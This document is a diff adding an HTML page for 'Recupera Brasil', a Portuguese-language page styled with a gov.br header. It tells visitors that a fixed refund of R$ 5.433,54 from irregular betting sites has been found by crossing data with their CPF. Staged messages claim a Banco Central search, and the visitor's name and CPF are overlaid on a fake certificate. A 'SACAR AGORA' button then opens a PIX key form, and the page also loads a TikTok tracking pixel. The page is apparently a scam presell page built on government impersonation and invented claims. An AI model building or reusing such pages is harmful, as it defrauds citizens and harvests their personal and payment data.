@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Resultado - Recupera Brasil</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <link rel="preload" href="transffoto/transfcerta.PNG?v=1" as="image">
+  <style>
+    /* Presell Layout Overrides */
+    body { background-color: #e2e8f0; background-image: none; padding: 0; margin: 0; min-height: 100vh; box-sizing: border-box; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; }
+    .main-wrapper { 
+      background: #ffffff; 
+      min-height: calc(100vh - 40px);
+      max-width: 480px; 
+      width: calc(100% - 24px);
+      margin: 20px auto; 
+      padding: 30px 24px; 
+      box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+      border-radius: 20px;
+      border: 1px solid #e2e8f0;
+    }
+    .gov-header {
+      background: #ffffff;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 2px solid #e1e1e1;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+      width: 100%;
+    }
+    .gov-header-logo img {
+      height: 32px;
+      width: auto;
+      pointer-events: none;
+      user-select: none;
+    }
+    .gov-header-user {
+      background: #1351b4;
+      color: #fff;
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .gov-header-user svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
+    .header { margin-bottom: 25px; }
+    
+    .greeting {
+      font-size: 22px;
+      font-weight: 800;
+      color: #0f172a;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .greeting span {
+      color: #1155cc;
+    }
+
+    .value-box {
+      background: #1155cc;
+      color: #ffffff;
+      border-radius: 16px;
+      padding: 6px 24px; /* Padding vertical bem reduzido */
+      text-align: center;
+      margin-bottom: 25px;
+      box-shadow: 0 8px 24px rgba(17, 85, 204, 0.25);
+    }
+    .value-box p {
+      font-size: 14px;
+      font-weight: 500;
+      margin-top: 4px;
+      margin-bottom: 2px;
+      opacity: 0.9;
+    }
+    .value-box h2 {
+      font-size: 32px;
+      font-weight: 800;
+      margin: 0;
+      letter-spacing: -0.5px;
+    }
+
+    .info-text {
+      color: #475569;
+      font-size: 14px;
+      line-height: 1.5;
+      text-align: center;
+      margin-bottom: 30px;
+      font-weight: 500;
+    }
+
+    .submit-btn {
+      border-radius: 30px !important;
+      background: #10b981 !important; /* Green button for checkout */
+      box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4) !important;
+      width: 100%;
+      padding: 16px 20px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-transform: uppercase;
+    }
+
+    .submit-btn:disabled {
+      background: #e2e8f0 !important;
+      color: #94a3b8 !important;
+      box-shadow: none !important;
+      cursor: not-allowed !important;
+    }
+
+    /* Modal Adjustments */
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    /* Certificado com sobreposição de texto */
+    .doc-wrapper {
+      position: relative;
+      width: 100%;
+      margin: 20px 0;
+      border-radius: 8px;
+      overflow: hidden;
+      min-height: 200px;
+      background: #f0f0f0;
+    }
+    /* Skeleton overlay enquanto imagem carrega */
+    .doc-skeleton {
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, #e8e8e8 25%, #f5f5f5 50%, #e8e8e8 75%);
+      background-size: 200% 100%;
+      animation: shimmer 1.4s infinite;
+      z-index: 20;
+      transition: opacity 0.4s ease;
+    }
+    .doc-skeleton.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+    @keyframes shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+    
+    /* Animacao dos pontinhos (wave) */
+    .dot-wave span {
+      animation: wave 1.3s infinite;
+      display: inline-block;
+    }
+    .dot-wave span:nth-child(1) { animation-delay: 0s; }
+    .dot-wave span:nth-child(2) { animation-delay: 0.15s; }
+    .dot-wave span:nth-child(3) { animation-delay: 0.3s; }
+    @keyframes wave {
+      0%, 60%, 100% { transform: translateY(0); }
+      30% { transform: translateY(-4px); }
+    }
+    
+    .doc-img {
+      width: 100%;
+      display: block;
+      pointer-events: none;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      user-select: none;
+    }
+    /* ========================================================
+       ⚠️ ZONA PROTEGIDA - POSICIONAMENTO DO CERTIFICADO ⚠️
+       NÃO ALTERAR NENHUM VALOR DE TOP, LEFT, WIDTH OU FONT-SIZE ABAIXO.
+       POSIÇÕES CALIBRADAS EXATAMENTE COM A IMAGEM.
+       ======================================================== */
+    /* Nome sobre o campo NOME COMPLETO da imagem */
+    .doc-nome {
+      position: absolute !important;
+      top: 34.2% !important;
+      left: 1.5% !important; 
+      width: 82% !important;
+      text-align: center !important;
+      font-size: clamp(7.5px, 2.3vw, 11px) !important;
+      font-weight: 700 !important;
+      color: #1a1a1a !important;
+      letter-spacing: 0.3px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+    /* CPF sobre o campo CPF da imagem */
+    .doc-cpf {
+      position: absolute !important;
+      top: 44.2% !important;
+      left: 12% !important; 
+      width: 34% !important;
+      text-align: center !important;
+      font-size: clamp(7.5px, 2.3vw, 11px) !important;
+      font-weight: 700 !important;
+      color: #1a1a1a !important;
+      letter-spacing: 0.5px;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+    /* ======================================================== */
+  
+    /* Bottom Sheet Modal Styles */
+    .modal-overlay {
+      align-items: flex-end !important; /* Align to bottom */
+      padding: 0 !important;
+    }
+    .modal-card {
+      width: 100% !important;
+      max-width: 480px !important; /* Limit width on desktop */
+      border-radius: 24px 24px 0 0 !important;
+      margin: 0 auto !important;
+      padding: 20px 16px 20px 16px !important; /* Less padding to reduce height */
+      transform: translateY(100%) !important;
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1) !important;
+    }
+    .modal-overlay.active .modal-card {
+      transform: translateY(0) !important;
+    }
+    .modal-card p, .modal-card span, .modal-card label, .modal-card input, .modal-card select {
+      font-size: 13px !important; /* Reduce font size */
+    }
+    .modal-card .submit-btn {
+      font-size: 14px !important;
+      padding: 14px !important;
+    }
+
+  
+    /* Previne zoom em inputs no iOS */
+    input, select, textarea {
+      font-size: 16px !important;
+      touch-action: manipulation;
+    }
+    </style>
+
+    <style>
+      /* Proteção global para todas as imagens */
+      img {
+        pointer-events: none !important;
+        -webkit-touch-callout: none !important;
+        -webkit-user-select: none !important;
+        user-select: none !important;
+      }
+    </style>
+    
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+    ttq.load('DA835D3C77UES9745010');
+    ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+</head>
+<body>
+
+  <header class="gov-header">
+    <div class="gov-header-logo">
+      <img src="logogv/logo-portal.png" alt="gov.br">
+    </div>
+    <div class="gov-header-user">
+      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+      <span id="nomeUsuarioHeader">Cidadão</span>
+    </div>
+  </header>
+
+  <div class="main-wrapper">
+    
+    <!-- Top Header (Nova Logo) -->
+    <header class="header">
+      <div class="brand-logo-container" style="width: 100%; max-width: 250px; margin: 0 auto; padding: 0;">
+        <picture><source srcset="bragoralogo/bragora.webp" type="image/webp"><img src="bragoralogo/bragora.PNG" alt="Direito de Receber de Volta" class="recupera-logo" style="width: 100%; border-radius: 0; box-shadow: none; filter: none; mix-blend-mode: normal;" draggable="false" oncontextmenu="return false;"></picture>
+      </div>
+    </header>
+
+    <main class="card-container" style="border: none; box-shadow: none; padding: 0; background: transparent;">
+      
+      <div id="resultContent">
+        <h1 class="greeting">Olá, <span id="userName">...</span></h1>
+
+        <div class="value-box">
+          <p>Você tem um valor de</p>
+          <h2>R$ 5.433,54</h2>
+          <p style="margin-top: 5px; font-size: 13px; opacity: 0.8;">a receber.</p>
+        </div>
+
+        <div class="info-text">
+          Estes valores foram identificados através do cruzamento de dados com seu CPF e histórico de depósitos em casas de apostas irregulares no Brasil, garantidos por lei. 
+          <br><br>
+          Segue abaixo seu certificado de comprovância com seus valores a receber.
+        </div>
+
+        <!-- Status Gerando Documento -->
+        <div id="docStatusMsg" style="text-align: center; color: #10b981; font-weight: 800; font-size: 15px; margin-bottom: 12px; height: 22px;">
+          <span id="docStatusText">Procurando seu documento no Banco Central</span><span class="dot-wave"><span>.</span><span>.</span><span>.</span></span>
+        </div>
+        <script>
+          (function(){
+            var msgs = [
+              "Procurando seu documento no Banco Central",
+              "Seu documento foi encontrado",
+              "Estamos trazendo ele aqui para você",
+              "Faltam apenas alguns instantes"
+            ];
+            var idx = 0;
+            var textEl = document.getElementById('docStatusText');
+            window.docInterval = setInterval(function() {
+              idx++;
+              if (idx < msgs.length) {
+                if(textEl) textEl.innerText = msgs[idx];
+              } else {
+                clearInterval(window.docInterval);
+              }
+            }, 3000);
+          })();
+        </script>
+
+        <!-- Certificado com Nome e CPF sobrepostos -->
+        <div class="doc-wrapper">
+          <div class="doc-skeleton" id="docSkeleton"></div>
+          <picture><source srcset="documentologo/documento2.webp?v=7" type="image/webp"><img src="documentologo/documento2.JPEG?v=7" alt="Certificado de Registro" class="doc-img" id="docImg" draggable="false" oncontextmenu="return false;"
+            onload="
+              clearInterval(window.docInterval);
+              document.getElementById('docSkeleton').classList.add('hidden');
+              document.getElementById('docNome').style.opacity='1';
+              document.getElementById('docCpf').style.opacity='1';
+              var statusMsg = document.getElementById('docStatusMsg');
+              if (statusMsg) {
+                statusMsg.innerHTML = 'Documento carregado com sucesso!';
+                setTimeout(function(){ statusMsg.style.display = 'none'; }, 3000);
+              }
+              setTimeout(function(){ var sk = document.getElementById('docSkeleton'); if(sk) sk.remove(); }, 500);
+            " /></picture>
+          <span class="doc-nome" id="docNome"></span>
+          <span class="doc-cpf" id="docCpf"></span>
+        </div>
+
+        <div class="info-text" style="margin-top: 20px;">
+          Clique no botão abaixo para iniciar a transferência via PIX para sua conta vinculada a este CPF.
+        </div>
+
+        <button class="submit-btn" id="sacarBtn">
+          SACAR AGORA
+        </button>
+
+      </div>
+    </main>
+  </div>
+
+  <!-- Checkout / PIX Modal (Migrado da Página 1) -->
+  <div class="modal-overlay" id="resultModal">
+    <div class="modal-card">
+      <button class="modal-close-btn" id="closeModalBtn">&times;</button>
+      
+      <div class="modal-brand-header">
+        <picture><source srcset="bragoralogo/bragora.webp" type="image/webp"><img src="bragoralogo/bragora.PNG" alt="Direito de Receber de Volta" class="modal-brand-logo" style="filter: none; mix-blend-mode: normal; width: 140px; box-shadow: none; border-radius: 0; background: transparent;" draggable="false" oncontextmenu="return false;"></picture>
+      </div>
+
+      <!-- Step: Selecionar Chave PIX -->
+      <div class="modal-step" id="stepPixKey">
+        <h3 class="modal-title" style="margin-top: 10px; font-size: 18px;">Dados do Recebedor</h3>
+        
+        <div class="result-info-box" style="margin-bottom: 15px; padding: 12px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px;">
+          <div class="result-row" style="margin-bottom: 8px;">
+            <span class="row-label" style="font-size: 12px; color: #64748b;">Nome Completo:</span>
+            <strong class="row-val" id="verifyName" style="font-size: 14px; color: #0f172a;">---</strong>
+          </div>
+          <div class="result-row">
+            <span class="row-label" style="font-size: 12px; color: #64748b;">CPF:</span>
+            <strong class="row-val" id="verifyCpf" style="font-size: 14px; color: #0f172a;">---</strong>
+          </div>
+        </div>
+
+        <p class="modal-status-text" style="font-size: 13px; color: #475569; margin-bottom: 15px; text-align: center; font-weight: 500;">
+          A transferência será enviada para este titular da chave PIX selecionada abaixo.
+        </p>
+
+        <div class="pix-key-selector" style="margin-bottom: 15px;">
+          <label style="display: block; font-size: 13px; font-weight: 700; color: #1e293b; margin-bottom: 8px;">Tipo de Chave PIX:</label>
+          <select id="pixKeyType" style="width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #cbd5e1; background: #ffffff; font-size: 14px; font-weight: 500; color: #0f172a; outline: none; margin-bottom: 12px;">
+            <option value="cpf">CPF</option>
+            <option value="celular">Celular</option>
+            <option value="email">E-mail</option>
+            <option value="aleatoria">Chave Aleatória</option>
+          </select>
+
+          <label style="display: block; font-size: 13px; font-weight: 700; color: #1e293b; margin-bottom: 8px;">Sua Chave PIX:</label>
+          <input type="text" id="pixKeyValue" placeholder="Digite sua chave PIX aqui..." style="width: 100%; padding: 10px; border-radius: 10px; border: 1px solid #cbd5e1; background: #ffffff; font-size: 13px; font-weight: 500; color: #0f172a; outline: none;" />
+          <p id="pixErrorMsg" style="color: #ef4444; font-size: 12px; font-weight: 500; margin-top: 5px; display: none;"></p>
+        </div>
+
+        <button class="submit-btn" id="verifyPayBtn" style="border-radius: 30px; font-size: 15px;" disabled>
+          CONTINUAR PARA O RECEBIMENTO
+        </button>
+      </div>
+    </div>
+  </div>
+  
+  <script src="resultado.js?v=5"></script>
+
+  <script>
+    (function() {
+      var nome = localStorage.getItem('recupera_nome');
+      if (nome) {
+        var primeiroNome = nome.trim().split(' ')[0];
+        primeiroNome = primeiroNome.charAt(0).toUpperCase() + primeiroNome.slice(1).toLowerCase();
+        var el = document.getElementById('nomeUsuarioHeader');
+        if (el) el.textContent = primeiroNome;
+      }
+    })();
+  </script>
+
+  <script>
+    // ─── REPASSADOR DE UTMs (ttclid, utm_source, etc.) ──────────────
+    (function() {
+      var urlParams = window.location.search;
+      if (!urlParams) return;
+      function appendParamsToLinks() {
+        var links = document.getElementsByTagName('a');
+        for (var i = 0; i < links.length; i++) {
+          var href = links[i].getAttribute('href');
+          if (!href || href.startsWith('#') || href.startsWith('javascript:') || href.startsWith('mailto:')) continue;
+          var sep = href.indexOf('?') !== -1 ? '&' : '?';
+          var params = urlParams.startsWith('?') ? urlParams.slice(1) : urlParams;
+          links[i].setAttribute('href', href + sep + params);
+        }
+      }
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', appendParamsToLinks);
+      } else {
+        appendParamsToLinks();
+      }
+    })();
+    // ────────────────────────────────────────────────────────────────
+  </script>
+</body>
+</html>
